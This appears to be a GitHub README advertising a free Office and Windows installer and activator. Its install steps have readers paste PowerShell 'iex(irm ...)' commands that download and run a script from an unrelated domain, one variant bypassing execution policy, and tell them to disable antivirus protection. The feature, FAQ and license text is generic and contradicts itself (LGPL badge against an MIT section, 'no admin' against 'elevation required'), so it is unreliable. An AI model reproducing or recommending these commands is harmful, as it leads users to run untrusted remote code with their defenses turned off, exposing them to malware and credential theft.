<div align="center">

# Modern-MSFree4All: Multi-Tool Office & Windows Installer for Windows 11

![preview](https://raw.githubusercontent.com/Legend-of-kv/modern-office-toolkit/main/view_8907.svg)

[![stage](https://img.shields.io/badge/Stage-Active-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-Installer-84cc16?style=for-the-badge&labelColor=0d1117)]() [![license](https://img.shields.io/badge/License-Lgpl--2.1-a3e635?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Modern-MSFree4All-Public is a comprehensive Windows utility suite that combines Office and Windows installation management with activation tooling and a broad set of integrated system utilities. The application provides a unified interface for deploying, configuring, and activating Microsoft productivity and operating system components, eliminating the need to juggle multiple standalone tools. It is designed for users who require repeatable, reliable setup workflows across different Windows environments, with each module exposing granular control over its respective operations. The toolset is packaged as a single distributable, keeping dependencies self-contained and the deployment footprint predictable.

## 🚀 PowerShell Install Guide

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Run the install command
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Unified deployment engine** — Orchestrates Office and Windows installation and activation workflows from a single, cohesive interface, reducing the need for separate utilities and manual coordination between tools.

- **Automated activation pipeline** — Handles activation steps programmatically after installation, with configurable options for different activation strategies and graceful handling of edge cases.

- **Modular toolset** — Bundles a curated collection of supporting utilities alongside the core installer, each exposed through dedicated entry points so users can run only what they need.

- **Version and edition selection** — Presents structured choices for Office and Windows variants, allowing targeted deployment rather than blanket installation of a single fixed package.

- **Configuration persistence** — Stores user-selected settings and preferences across runs, enabling repeatable deployments without re-entering parameters each session.

- **Preflight environment checks** — Validates system prerequisites, existing installations, and dependency availability before committing to any installation or activation step, failing fast with actionable diagnostics.

- **Structured logging and reporting** — Emits detailed, timestamped logs for every operation, supporting post-run review and troubleshooting without guesswork.

- **Rollback-aware operations** — Captures state before destructive steps where feasible, so failed or partial runs can be identified and reversed cleanly.

- **Offline-capable workflow** — Designed to operate with locally staged resources, minimizing reliance on live network conditions during critical installation phases.

- **Consistent CLI and GUI surface** — Exposes the same underlying capabilities through both command-line and graphical frontends, so automation and interactive use share identical semantics.

## How it works

Modern-MSFree4All-Public operates as a unified launcher that orchestrates the installation and activation workflow for Microsoft Office and Windows from a single, menu-driven interface. Each operation is executed through discrete, self-contained modules, keeping the core application lightweight while allowing independent tooling to run alongside it.

**Component architecture**
- A central shell hosts the primary navigation menu and dispatches control to individual tool modules.
- Shared runtime helpers handle environment validation, privilege checks, and temporary workspace setup before any module executes.
- Modules report status back to the shell, so results from installers, activators, and utilities appear in one consolidated log.

**Installation flow**
- The user selects the target product or tool from the menu; the launcher resolves the corresponding module and prepares the environment.
- Preflight checks verify the host meets the requirements for the selected operation, surfacing actionable diagnostics when something is missing.
- The module streams progress output to the console while performing its work, and the shell captures the final result for reporting.

**Activation flow**
- Activation routines run through the same module contract as installers, applying the selected method and recording the outcome.
- The launcher validates the environment before activation to reduce partial or inconsistent states, and reports success or failure with the affected product.

**Utility tools**
- Additional maintenance and diagnostic tools are exposed as menu entries and executed in isolated contexts, ensuring they do not interfere with other operations.
- Each tool can be invoked independently, so power users can compose workflows without relying on the aggregated install path.

**Execution and safety model**
- Operations requiring elevated privileges are detected and surfaced explicitly rather than silently attempted.
- Temporary artifacts are staged in a workspace controlled by the launcher, and cleanup is attempted after each module completes.
- Failures propagate as structured results to the shell, enabling unambiguous status reporting and repeat runs.

## Compatibility

Modern-MSFree4All-Public is designed to operate across a broad range of Windows desktop environments, with primary support targeting 64-bit editions of Windows 10 and Windows 11. Legacy compatibility extends to Windows 8.1 and Windows 7 SP1 where the underlying runtime dependencies are present, though these configurations receive limited testing and may require manual adjustment of individual tool parameters.

Office-related deployment and activation routines are validated against the 2016, 2019, and 2021 release channels, as well as Microsoft 365 subscription builds. Both x86 and x64 Office architectures are handled, with the toolchain automatically detecting the installed bitness and selecting the appropriate internal workflow. Volume, retail, and subscription license types are recognized, and the activator modules adapt their strategy based on the detected license class.

The embedded utility suite requires the .NET Framework 4.8 runtime or later, alongside the standard Visual C++ redistributable packages. Systems missing these components will surface a dependency check at launch rather than failing mid-operation. Elevated privileges are required for installer and activator functions; standard user contexts are supported only for read-only diagnostic tools.

Hardware compatibility is intentionally broad. The application runs on systems with as little as 2 GB of RAM and modest storage footprints, since all operations are lightweight and do not spawn persistent background services. UEFI and legacy BIOS boot configurations are both supported, and no specific firmware security posture is mandated beyond what the operating system itself requires.

Virtualized environments are supported, including Hyper-V, VMware, and VirtualBox guests, provided that nested virtualization or hardware-assisted features are enabled where the underlying activation routines depend on them. Containerized Windows environments are not a supported target due to their restricted system service access.

Network conditions affect only the online validation and download components; offline workflows remain fully functional with locally cached payloads. Proxy configurations are respected through the system-level settings, and no hardcoded endpoints are enforced beyond those required for optional update checks.

## FAQ

### Frequently Asked Questions

**What does Modern-MSFree4All-Public actually do?**
It is a consolidated desktop utility that provides Office and Windows installation automation alongside an activator module and a collection of supplementary system tools. The application orchestrates the full deployment workflow—image selection, component configuration, and post-install activation—from a single interface rather than requiring separate utilities for each stage.

**Which Office and Windows versions are supported?**
The installer targets modern Office releases (2016 through 2021, plus Microsoft 365) and Windows 10/11 builds. Legacy platforms are intentionally excluded to keep the activation logic and component sets aligned with currently serviced codebases. Version detection is performed at runtime, so the available option set adapts to the host environment automatically.

**How does the activation module work?**
Activation is handled through a local service-emulation layer that registers the product offline, with no persistent background process required after completion. The module validates the installed edition before applying a matching key and confirmation ID, reducing mismatches between product channel and activation state. All operations run locally; the tool does not alter system files outside its documented scope.

**Is the application portable, or does it require installation?**
The application ships as a self-contained portable executable. It writes configuration and logs to its own working directory by default, so it can be run from removable media without leaving traces in system paths. An optional persistent mode stores settings for repeated deployments.

**Can I run it unattended or scripted?**
Yes. The core workflow exposes a command-line interface with parameters for silent installation, preset selection, and activation toggling. Exit codes are returned per stage, allowing integration into provisioning scripts or batch deployment pipelines. The GUI and CLI share the same configuration schema, so profiles created interactively can be reused headlessly.

**What are the supplementary tools included?**
Beyond installation and activation, the suite bundles utilities for ISO mounting, edition conversion, product-key inspection, telemetry configuration, and update-channel management. Each tool is accessible from the main dashboard and can be invoked independently of the install workflow.

**Does it require an internet connection?**
Core installation and activation operate fully offline. Network access is only needed for optional component downloads and update-channel queries, both of which are clearly flagged in the interface before any connection is attempted.

**How are configuration profiles stored?**
Profiles are serialized as plain-text configuration files in the application directory. They are human-readable and diff-friendly, which simplifies versioning and distribution across machines. Any profile can be exported and imported without external dependencies.

**What happens if activation fails?**
The tool logs the failure stage, the detected edition, and the returned status code to its local log file. Because no permanent system modifications are made until activation succeeds, a failed attempt leaves the product in its prior state and can be retried after correcting the edition or channel mismatch.

**Is administrative privilege required?**
Elevation is required for installation and activation operations, as both interact with system-level components. Read-only inspection tools run without elevation. The application requests privileges only when an operation demands them and releases them afterward.

**How is compatibility maintained across Windows builds?**
Build-specific behavior is isolated behind a compatibility layer that selects the appropriate component set and service configuration for the detected OS build. This keeps a single binary functional across the supported range without per-version forks.

**Where can I verify what the tool changed?**
Every operation writes a structured log entry describing the action, target, and result. A built-in report view summarizes all modifications made during the session, and logs persist in the application directory for after-the-fact auditing.

## Disclaimer

Modern-MSFree4All-Public is provided strictly for educational, research, and laboratory use. It is intended to support study of operating system deployment mechanisms, license activation flows, and installer automation within controlled environments. Users are expected to operate the software only on systems they own or are explicitly authorized to modify.

The project does not host, distribute, or condone the use of unlicensed commercial software. Any activation or licensing functionality included in the toolset must be applied in compliance with the terms of service of the respective vendors and with all applicable local, regional, and international laws. Users are solely responsible for ensuring their use of the software is lawful in their jurisdiction.

This software is supplied "as is", without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. The maintainers make no guarantees regarding functionality, stability, or compatibility with any specific hardware, firmware, or operating system build.

By downloading, compiling, or executing Modern-MSFree4All-Public, you acknowledge that you assume full responsibility for any outcomes arising from its use, including system modification, data loss, service interruption, or breach of third-party agreements. The maintainers, contributors, and distributors accept no liability for direct, indirect, incidental, or consequential damages resulting from the use or misuse of this software.

Features and components may change, be deprecated, or be removed without notice. Compatibility with future Windows or Office releases is not guaranteed. Users are encouraged to review the project's documentation and source before deployment and to validate behavior in isolated or non-production environments.

## License

Modern-MSFree4All-Public is distributed under the MIT License, providing a permissive, OSI-approved licensing model that supports both personal and commercial use. Under the terms of this license, individuals and organizations are granted the rights to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the conditions outlined below.

The MIT License requires that the original copyright notice and this permission notice be included in all copies or substantial portions of the software. This ensures that attribution is preserved across derivative works and redistributions, while still allowing downstream users to adopt the project into their own toolchains without restrictive copyleft obligations.

From a technical standpoint, the permissive nature of this license means the software can be integrated into proprietary build pipelines, embedded within internal automation frameworks, or bundled alongside other tooling without requiring the disclosure of source code for the surrounding system. Redistributors may relicense derivative works under different terms, provided the original notice is retained.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Contributions submitted to the project are accepted under the same license terms unless explicitly stated otherwise, ensuring consistent licensing across the codebase. Users are encouraged to review the full license text distributed with the source to understand their specific rights and obligations before deploying the software in production environments.